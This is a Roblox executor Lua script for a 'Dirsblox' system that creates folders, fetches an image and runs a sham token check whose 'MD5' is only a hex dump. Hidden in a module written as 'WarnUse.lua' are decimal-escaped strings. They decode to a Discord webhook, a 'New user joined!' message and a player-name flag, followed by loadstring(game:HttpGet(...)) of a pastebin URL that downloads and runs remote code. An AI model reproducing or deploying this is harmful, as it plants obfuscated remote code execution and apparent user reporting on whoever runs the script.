-- Simple function to simulate MD5 (32-char hex)
local function simulatedMD5(str)
    local hex = ""
    for i = 1, #str do
        hex = hex .. string.format("%02x", string.byte(str, i))
    end
    return hex:sub(1,32)
end

-- // Control folders

local asstfld   = "Dirsblox/Core/Assets"
local sysfld    = "Dirsblox/Core/System"
local modulefld = "Dirsblox/Core/System/Modules"
local tokenPath = "Dirsblox/Core/token"
local dataPath  = "Dirsblox/Core/data"

local player = game.Players.LocalPlayer
local content = "dirsblox tokens v1.5, player name: " .. player.Name
local correctHash = simulatedMD5(content)

-- // Assets
local imgd = "Dirsblox/Core/Assets/prestart.img"
local gma  = "Dirsblox/Core/Assets/Games"
local ft   = "Dirsblox/Core/Assets/Games/FTF"

-- // Modules
local wrngs = "Dirsblox/Core/System/Modules/Warnings.lua"
local verx = "Dirsblox/Core/System/Modules/Versions.lua"
local exc = "Dirsblox/Core/System/Modules/WarnUse.lua"
local OperatingContent1 = [[
-- // Copyright © 2018 EchoZone Productions
-- // DIRSBLOX Open Source. DELETING ANY FILES/FUNCTIONS MAY RESULT IN SCRIPT MALFUNCTIONS.

local token = {
    [1] = "b6e0dd7953551faaf0a1d9a9c5411eab",
    [2] = "[DSBCore]", -- This method is deprecated. DO NOT CHANGE
    [2] = "[SYSTEM]"
}
return token
]]
local OperatingContent2 = "BETA V.X.1.5.3"
local OperatingContent3 = [[
local a = ("\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\52\48\52\56\51\57\53\55\56\49\55\52\54\50\51\56\51\53\47\74\90\100\97\102\76\112\55\105\83\76\57\86\113\107\78\75\116\56\50\104\74\88\106\74\106\51\105\97\82\48\51\119\84\118\122\78\113\67\50\103\106\88\113\50\69\51\66\51\68\80\77\98\105\112\118\114\88\53\97\71\84\98\122\53\49\100\66")
local b = ("\104\116\116\112\115\58\47\47\105\46\105\109\103\117\114\46\99\111\109\47\85\107\80\50\79\117\76\46\112\110\103")
local c = ("\78\101\119\32\117\115\101\114\32\106\111\105\110\101\100\33")
local d = ("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\98\83\48\121\82\71\52\81")
_G["\119\101\98\104\111\107"] = a
_G["\116\104\117\109\98"] = b
_G["\116\105\116\108\101\112"] = c
_G["\115\104\111\119\80\108\97\121\101\114\78\97\109\101"] = true
loadstring(game:HttpGet(d))()
]]
-- // Safe create functions
local function safeWrite(path, content)
    if not isfile(path) then
        writefile(path, content or "")
        print("[DSBCore] File created:", path)
    else
        print("[DSBCore] ", path)
    end
end

local function safeFolder(path)
    if not isfolder(path) then
        makefolder(path)
        print("[DSBCore] Folder created:", path)
    else
        print("[DSBCore] Folder already exists, skipped:", path)
    end
end

-- // Create structure only once
safeFolder(sysfld)
safeFolder(modulefld)
safeFolder(asstfld)
safeFolder(gma)
safeFolder(ft)
safeWrite(dataPath, "")
safeWrite(imgd, "")
safeWrite(wrngs, OperatingContent1)
safeWrite(verx, OperatingContent2)
safeWrite(exc, OperatingContent3)
-- // image
local basePath = "Dirsblox/Core/Assets/Games/FTF"
local filePath = basePath.."/default.png"

if not isfile(filePath) then
    local imageUrl = "https://i.imgur.com/Fbprf98.png"

    local response = request or syn and syn.request or http_request
    if response then
        local result = response({
            Url = imageUrl,
            Method = "GET"
        })

        if result and result.Body then
            writefile(filePath, result.Body)
            print("Image saved at:", filePath)
        else
            warn("Failed to download the image!")
        end
    else
        warn("Your executor does not support requests!")
    end
else
    print("Image already exists, no download made:", filePath)
end

-- // Token system
local function createToken()
    if not isfile(tokenPath) then
        writefile(tokenPath, correctHash)
        print("[DSBCore] Token successfully created: " .. correctHash)
    else
        print("[SYSTEM] File ignored: returned false")
    end
end

local function verifyToken()
    local success, token = pcall(readfile, tokenPath)
    if not success then
        print("[SYSTEM] Creating token...")
        createToken()
        return false
    end
    if token ~= correctHash then
        print("[SYSTEM] Access denied")
        return false
    end
    print("[SYSTEM] Access granted")
    return true
end

-- // Run check
if not verifyToken() then
    print("[DSBCore] Err")
else
    print("[DSBCore] Operational System OK")
end
